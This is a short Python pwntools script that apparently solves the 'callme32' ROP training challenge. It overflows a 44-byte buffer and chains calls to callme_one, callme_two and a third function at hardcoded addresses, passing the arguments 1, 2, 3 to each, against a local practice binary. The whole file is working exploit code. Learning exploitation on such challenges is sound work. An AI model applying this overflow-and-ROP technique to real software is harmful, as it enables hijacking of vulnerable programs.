from pwn import *

context(os="linux", arch="i386")

def main():
	conn = process('./callme32')
	argument = "\x01\x00\x00\x00" + \
				"\x02\x00\x00\x00" + \
				"\x03\x00\x00\x00" # 1,2,3

	#ROP Chain
	payload = ''
	payload += 'A' * 44
	payload += '\xc0\x85\x04\x08' # callme_one
	payload += '\xa9\x88\x04\x08' # return address
	payload += argument # 1,2,3
	payload += '\x20\x86\x04\x08' # callme_two
	payload += '\xa9\x88\x04\x08' # return address
	payload += argument # 1,2,3
	payload += '\xb0\x85\x04\x08'
	payload += 'A' * 4
	payload += argument
	payload += '\n'

	print(conn.recv(100))
	conn.send(payload)
	
	print(conn.recv(100))

if __name__ == "__main__":
	main()

